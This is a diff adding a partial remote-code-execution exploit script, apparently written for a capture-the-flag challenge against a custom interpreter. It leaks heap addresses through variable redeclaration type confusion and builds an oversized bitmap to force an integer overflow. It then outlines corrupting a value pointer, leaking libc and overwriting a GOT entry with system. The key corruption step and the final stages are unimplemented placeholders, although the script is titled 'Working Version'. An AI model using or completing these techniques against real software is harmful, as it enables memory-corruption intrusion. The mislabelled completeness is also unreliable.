@@ -1,0 +1,46 @@
+print("=== Complete RCE Exploit - Working Version ===");
+
+print("=== STEP 1: Leak Heap Addresses ===");
+int leak1 = 0;
+string leak1 = "first";
+int addr1 = leak1;
+print(addr1);
+
+int leak2 = 0;
+string leak2 = "second";
+int addr2 = leak2;
+print(addr2);
+
+int leak3 = 0;
+string leak3 = "third";
+int addr3 = leak3;
+print(addr3);
+
+print("=== STEP 2: Create Target Variable ===");
+int target = 0;
+string target = "target";
+int targetaddr = target;
+print("Target string address:");
+print(targetaddr);
+
+print("=== STEP 3: Create Bitmap ===");
+bitmap b1 = create(9223372036854775807, 2);
+
+print("=== STEP 4: Corrupt value_ptr ===");
+print("STATUS: Not yet implemented");
+print("Need to:");
+print("1. Find entry_addr (OOB read or estimate)");
+print("2. Find bitmap_data_ptr (OOB read or estimate)");
+print("3. Calculate y and x coordinates");
+print("4. Write 0x409048 bit-by-bit to value_ptr");
+
+print("=== STEP 5: Read libc Address ===");
+int libcleak = target;
+print("Current value (should be libc address after Step 4):");
+print(libcleak);
+
+print("=== STEP 6-8: Calculate system, Write to GOT, Trigger ===");
+print("Will work once Step 4 is complete");
+
+print("=== Next: Implement Step 4 address finding ===");
+
